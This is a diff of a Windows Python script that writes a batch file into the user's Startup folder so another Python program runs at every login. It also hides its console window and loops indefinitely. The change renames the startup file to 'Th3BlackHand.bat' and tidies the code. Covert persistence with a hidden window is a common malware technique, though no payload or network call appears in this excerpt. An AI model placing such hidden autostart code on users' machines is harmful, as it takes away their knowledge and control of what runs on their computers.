@@ -3,20 +3,18 @@ import getpass
 import os
 import socket
 import time
-import win32process
 import ctypes
 
 USER_NAME = getpass.getuser() 
 file_path = "C:/Users/Laptop/AppData/Local/Programs/Python/Python37/python.exe C:/Users/Laptop/Desktop/OutForCoffe/OfC.py" # Modify the paths accordingly 
 bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME # i suppose this works for all windows users :) 
-with open(bat_path + '\\' + "OutForCoffee.bat", "w+") as bat_file:
+with open(bat_path + '\\' + "Th3BlackHand.bat", "w+") as bat_file:
     bat_file.write(r'start "" %s' % file_path)
 
-hwnd = ctypes.windll.kernel32.GetConsoleWindow()      
-if hwnd != 0:      
-    ctypes.windll.user32.ShowWindow(hwnd, 0)      
-    ctypes.windll.kernel32.CloseHandle(hwnd)
-    _, pid = win32process.GetWindowThreadProcessId(hwnd)
+CMD = ctypes.windll.kernel32.GetConsoleWindow()      
+if CMD != 0:      
+    ctypes.windll.user32.ShowWindow(CMD, 0)      
+    ctypes.windll.kernel32.CloseHandle(CMD)
 
 while True:
     time.sleep(2)
